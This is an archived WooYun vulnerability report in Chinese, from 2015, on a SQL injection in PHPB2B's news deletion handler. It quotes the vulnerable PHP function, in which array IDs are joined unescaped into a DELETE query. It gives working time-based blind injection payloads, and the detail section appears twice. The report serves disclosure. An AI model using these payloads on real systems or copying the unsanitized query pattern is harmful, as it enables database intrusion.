{"id": 40983, "wybug_id": "wooyun-2015-090297", "wybug_title": "PHPB2B某处sql注入#4", "wybug_corp": "phpb2b.com", "wybug_author": "Th1nk", "wybug_date": "2015-01-07 12:42", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： PHPB2B某处sql注入#4 详细说明：  PHPB2B某处sql注入官网下载的最新版本virtual-office/news.php73-80行\nif (isset($_POST['del'])) {        $result = $companynews->del($_POST['newsid'], $conditions);        if ($result) {                flash(\"success\");        }else {                flash(\"action_failed\");        }}\npost的数据传入del函数，跟入看看。\nfunction del($ids, $conditions = null, $table = null)        {                $del_id = $this->primaryKey;                $tmp_ids = $condition = null;                if (is_array($ids))                {                        $tmp_ids = implode(\",\",$ids);                        $cond[] = \"{$del_id} IN ({$tmp_ids})\";                        $this->catchIds = serialize($ids);                }                else                {                        $cond[] = \"{$del_id}=\".intval($ids);                        $this->catchIds = $ids;                }                if (!empty($table)) {                        $table_name = $this->table_prefix.$table;                }else{                        $table_name = $this->getTable();                }                if(!empty($conditions)) {                        if(is_array($conditions)) {                                $tmp_where_cond = implode(\" AND \", $conditions);                                $cond[] = $tmp_where_cond;                        }                        else {                                $cond[] = $conditions;                        }                }                $this->setCondition($cond);                $sql = \"DELETE FROM \".$table_name.$this->getCondition();                $deleted = $this->dbstuff->Execute($sql);                unset($this->condition);                return $deleted;        }\n关键在这一句if (is_array($ids)){$tmp_ids = implode(\",\",$ids);$cond[] = \"{$del_id} IN ({$tmp_ids})\";$this->catchIds = serialize($ids);}else{$cond[] = \"{$del_id}=\".intval($ids);$this->catchIds = $ids;}如果传入的ids是个数组的话，就没有intval强制类型转换了，并且两边没有用单引号括起来。于是这里出现了注入，无视GPC。因为是delete型，时间盲注。演示。POST提交urllocalhost/phpb2b/virtual-office/news.php提交内容del=1&newsid[]=1123,123)||if(1=1,sleep(3),0)%23成功延时del=1&newsid[]=1123,123)||if(1=2,sleep(3),0)%23不延时PS:工作人员在测试时，一定记得先加上一条新闻，确保表中有数据   漏洞证明：  PHPB2B某处sql注入官网下载的最新版本virtual-office/news.php73-80行\nif (isset($_POST['del'])) {        $result = $companynews->del($_POST['newsid'], $conditions);        if ($result) {                flash(\"success\");        }else {                flash(\"action_failed\");        }}\npost的数据传入del函数，跟入看看。\nfunction del($ids, $conditions = null, $table = null)        {                $del_id = $this->primaryKey;                $tmp_ids = $condition = null;                if (is_array($ids))                {                        $tmp_ids = implode(\",\",$ids);                        $cond[] = \"{$del_id} IN ({$tmp_ids})\";                        $this->catchIds = serialize($ids);                }                else                {                        $cond[] = \"{$del_id}=\".intval($ids);                        $this->catchIds = $ids;                }                if (!empty($table)) {                        $table_name = $this->table_prefix.$table;                }else{                        $table_name = $this->getTable();                }                if(!empty($conditions)) {                        if(is_array($conditions)) {                                $tmp_where_cond = implode(\" AND \", $conditions);                                $cond[] = $tmp_where_cond;                        }                        else {                                $cond[] = $conditions;                        }                }                $this->setCondition($cond);                $sql = \"DELETE FROM \".$table_name.$this->getCondition();                $deleted = $this->dbstuff->Execute($sql);                unset($this->condition);                return $deleted;        }\n关键在这一句if (is_array($ids)){$tmp_ids = implode(\",\",$ids);$cond[] = \"{$del_id} IN ({$tmp_ids})\";$this->catchIds = serialize($ids);}else{$cond[] = \"{$del_id}=\".intval($ids);$this->catchIds = $ids;}如果传入的ids是个数组的话，就没有intval强制类型转换了，并且两边没有用单引号括起来。于是这里出现了注入，无视GPC。因为是delete型，时间盲注。演示。POST提交urllocalhost/phpb2b/virtual-office/news.php提交内容del=1&newsid[]=1123,123)||if(1=1,sleep(3),0)%23成功延时del=1&newsid[]=1123,123)||if(1=2,sleep(3),0)%23不延时PS:工作人员在测试时，一定记得先加上一条新闻，确保表中有数据   修复方案：  过滤   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-01-07 23:38 厂商回复： 最新版已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}